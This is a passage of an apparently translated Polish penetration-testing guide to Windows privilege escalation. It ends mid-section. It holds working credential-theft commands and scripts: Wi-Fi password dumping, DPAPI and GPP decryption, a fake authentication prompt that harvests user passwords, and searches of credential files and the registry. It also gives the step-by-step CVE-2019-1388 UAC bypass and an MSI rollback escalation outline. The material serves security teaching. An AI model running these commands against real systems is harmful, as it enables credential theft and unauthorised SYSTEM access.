**Poświadczenia PowerShell** są często używane do **scriptingu** i zadań automatyzacji jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Poświadczenia są chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko przy użyciu tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchamiane polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menedżer poświadczeń Pulpitu zdalnego**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Użyj modułu `dpapi::rdg` narzędzia **Mimikatz** z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Za pomocą modułu `sekurlsa::dpapi` narzędzia Mimikatz można **wyodrębnić wiele kluczy głównych DPAPI** z pamięci

### Sticky Notes

Użytkownicy często korzystają z aplikacji Sticky Notes na stacjach roboczych z systemem Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że jest to plik bazy danych. Plik ten znajduje się w lokalizacji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać oraz przeanalizować.

### AppCmd.exe

**Pamiętaj, że aby odzyskać hasła z AppCmd.exe, musisz mieć uprawnienia Administratora i uruchomić proces na poziomie High Integrity.**\
Plik **AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano pewne **dane uwierzytelniające**, które można **odzyskać**.

Ten kod został wyodrębniony z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (Informacje pochodzą z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Pliki i rejestr (poświadczenia)

### Poświadczenia PuTTY
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Klucze hosta SSH PuTTY
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, dlatego należy sprawdzić, czy znajduje się tam coś interesującego:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz dowolny wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany w formie zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji na temat tej techniki znajdziesz tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie jest uruchomiona i chcesz, aby uruchamiała się automatycznie podczas rozruchu, wykonaj:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Wygląda na to, że ta technika nie jest już aktualna. Spróbowałem utworzyć kilka kluczy ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh do maszyny. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania za pomocą klucza asymetrycznego.

### Pliki unattended
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM i SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Poświadczenia chmurowe
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Cached GPP Password

Wcześniej dostępna była funkcja umożliwiająca wdrażanie niestandardowych kont lokalnego administratora na grupie komputerów za pośrednictwem Group Policy Preferences (GPP). Metoda ta miała jednak poważne luki w zabezpieczeniach. Po pierwsze, Group Policy Objects (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, szyfrowane za pomocą AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez dowolnego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to ryzyko, opracowano funkcję wyszukującą lokalnie zbuforowane pliki GPP zawierające niepuste pole „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera informacje o GPP i lokalizacji pliku, ułatwiając identyfikację oraz usunięcie tej luki w zabezpieczeniach.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Użycie crackmapexec do uzyskania haseł:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Konfiguracja IIS Web
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład pliku web.config z poświadczeniami:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Dane uwierzytelniające OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie jego danych uwierzytelniających lub nawet danych uwierzytelniających innego użytkownika**, jeśli sądzisz, że może je znać (pamiętaj, że bezpośrednie **proszenie** klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** w **jawnym tekście** lub **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Przeszukaj wszystkie proponowane pliki:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Dane uwierzytelniające w RecycleBin

Powinieneś również sprawdzić Kosz, aby znaleźć znajdujące się w nim dane uwierzytelniające

Aby **odzyskać hasła** zapisane przez różne programy, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Wyodrębnianie kluczy openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Należy sprawdzić bazy danych, w których przechowywane są hasła z **Chrome lub Firefox**.\
Należy również sprawdzić historię, zakładki i ulubione przeglądarek, ponieważ mogą być tam przechowywane **hasła**.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **interkomunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a każdy komponent udostępnia funkcjonalność za pomocą co najmniej jednego interfejsu, identyfikowanego przez identyfikatory interfejsów (IID).

Klasy i interfejsy COM są zdefiniowane w rejestrze odpowiednio pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr jest tworzony przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wewnątrz identyfikatorów CLSID tego rejestru można znaleźć podrzędny klucz rejestru **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może przyjmować wartość **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) lub **Neutral** (Thread Neutral).

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolne biblioteki DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli dana biblioteka DLL zostanie uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak attackers używają COM Hijacking jako mechanizmu persistence, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Wyszukiwanie zawartości plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Wyszukiwanie pliku o określonej nazwie**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Przeszukaj rejestr pod kątem nazw kluczy i haseł**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia wyszukujące hasła

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin, który utworzyłem, aby **automatically execute every metasploit POST module that searches for credentials** wewnątrz ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do extract password z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sessions**, **usernames** i **passwords** kilku narzędzi, które zapisują te dane w clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handles

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, ale dziedziczący wszystkie otwarte handles procesu głównego**.\
Następnie, jeśli masz **pełny dostęp do procesu z niskimi uprawnieniami**, możesz przejąć **otwarty handle do uprzywilejowanego procesu utworzonego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o tym, **jak wykryć i wykorzystać tę podatność**.](leaked-handle-exploitation.md)\
[Przeczytaj ten **inny wpis, aby uzyskać pełniejsze wyjaśnienie, jak testować i wykorzystywać większą liczbę otwartych handles procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko z pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonation klienta Named Pipe

Segmenty pamięci współdzielonej, określane jako **pipes**, umożliwiają komunikację między procesami i transfer danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, która pozwala niepowiązanym procesom współdzielić dane, nawet za pośrednictwem różnych sieci. Przypomina to architekturę klient/serwer, w której role są określane jako **named pipe server** i **named pipe client**.

Gdy dane są wysyłane przez **clienta** za pośrednictwem pipe, **server**, który skonfigurował pipe, może **przyjąć tożsamość** **clienta**, pod warunkiem że ma wymagane prawa **SeImpersonate**. Zidentyfikowanie **uprzywilejowanego procesu**, który komunikuje się za pośrednictwem pipe, który możesz imitować, daje możliwość **uzyskania wyższych uprawnień** poprzez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z utworzonym przez Ciebie pipe. Instrukcje dotyczące przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) oraz [**tutaj**](#from-high-integrity-to-system).

Ponadto poniższe narzędzie umożliwia **przechwytywanie komunikacji named pipe za pomocą narzędzia takiego jak burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a to narzędzie pozwala wyświetlić listę wszystkich pipes i zobaczyć je w celu znalezienia privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Zdalny zapis DWORD przez Telephony tapsrv prowadzący do RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny uwierzytelniony client może wykorzystać opartą na mailslotach ścieżkę asynchronicznych zdarzeń, aby przekształcić `ClientAttach` w dowolny **zapis 4-bajtowy** do dowolnego istniejącego pliku, do którego zapisu ma uprawnienia `NETWORK SERVICE`, a następnie uzyskać prawa administratora Telephony i załadować dowolny DLL jako usługa. Pełny przebieg:

- `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę z prawem zapisu → usługa otwiera ją za pomocą `CreateFileW(..., OPEN_EXISTING)` i używa jej do zapisu asynchronicznych zdarzeń.
- Każde zdarzenie zapisuje kontrolowany przez atakującego `InitContext` z `Initialize` do tego handle. Zarejestruj aplikację linii za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz dane za pomocą `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj ją/zamknij usługę, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do DLL, aby wykonać `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej informacji:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą wykonywać kod w Windows

Sprawdź stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużycie protocol handler / ShellExecute za pośrednictwem rendererów Markdown

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą uruchamiać niebezpieczne URI handlers (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie Command Lines w poszukiwaniu haseł**

Podczas uzyskiwania shella jako użytkownik mogą być wykonywane scheduled tasks lub inne procesy, które **przekazują dane uwierzytelniające w command line**. Poniższy skrypt przechwytuje command lines procesów co dwie sekundy i porównuje bieżący stan z poprzednim stanem, wyświetlając wszelkie różnice.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kradzież haseł z procesów

## Od użytkownika z niskimi uprawnieniami do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (za pośrednictwem konsoli lub RDP), a funkcja UAC jest włączona, w niektórych wersjach Microsoft Windows możliwe jest uruchomienie terminala lub dowolnego innego procesu jako „NT\AUTHORITY SYSTEM” z poziomu użytkownika bez uprawnień.

Umożliwia to jednoczesne eskalowanie uprawnień i ominięcie UAC dzięki tej samej luce. Ponadto nie ma potrzeby instalowania czegokolwiek, a plik binarny używany podczas tego procesu jest podpisany i wydany przez Microsoft.

Niektóre z podatnych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę podatność, należy wykonać następujące kroki:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Z poziomu Administrator Medium do High Integrity Level / UAC Bypass

Przeczytaj to, aby **dowiedzieć się więcej o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się więcej o UAC i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Z Arbitrary Folder Delete/Move/Rename do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), wraz z kodem exploita [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Atak polega zasadniczo na wykorzystaniu funkcji rollback Windows Installer do zastąpienia legalnych plików złośliwymi podczas procesu deinstalacji. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który zostanie użyty do przejęcia folderu `C:\Config.Msi`. Folder ten będzie później używany przez Windows Installer do przechowywania plików rollback podczas deinstalacji innych pakietów MSI, przy czym pliki rollback zostaną zmodyfikowane tak, aby zawierały złośliwy payload.

Podsumowanie techniki wygląda następująco:

1. **Stage 1 – Przygotowanie do Hijack (pozostawienie `C:\Config.Msi` pustego)**

- Step 1: Instalacja MSI
- Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w folderze z prawem zapisu (`TARGETDIR`).
- Oznacz instalator jako **"UAC Compliant"**, aby **non-admin user** mógł go uruchomić.
- Po instalacji pozostaw otwarty **handle** do pliku.

- Step 2: Rozpoczęcie deinstalacji
- Odinstaluj ten sam plik `.msi`.
- Proces deinstalacji zacznie przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe rollback).
- **Polluj otwarty handle pliku** za pomocą `GetFinalPathNameByHandle`, aby wykryć moment, gdy plik stanie się `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Plik `.msi` zawiera **custom uninstall action (`SyncOnRbfWritten`)**, która:
- Sygnalizuje, gdy plik `.rbf` zostanie zapisany.
- Następnie **czeka** na inne zdarzenie przed kontynuowaniem deinstalacji.

- Step 4: Zablokowanie usunięcia `.rbf`
- Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — **uniemożliwia to jego usunięcie**.
- Następnie **odeślij sygnał**, aby deinstalacja mogła się zakończyć.
- Windows Installer nie może usunąć `.rbf`, a ponieważ nie może usunąć całej zawartości, folder `C:\Config.Msi` **nie zostanie usunięty**.

- Step 5: Ręczne usunięcie `.rbf`
- Ty (atakujący) ręcznie usuwasz plik `.rbf`.
- Teraz **`C:\Config.Msi` jest pusty**, gotowy do przejęcia.

> W tym momencie **uruchom vulnerability umożliwiającą SYSTEM-level arbitrary folder delete**, aby usunąć `C:\Config.Msi`.

2. **Stage 2 – Zastąpienie skryptów Rollback złośliwymi skryptami**

- Step 6: Ponowne utworzenie `C:\Config.Msi` ze słabymi ACL
- Utwórz ponownie folder `C:\Config.Msi`.
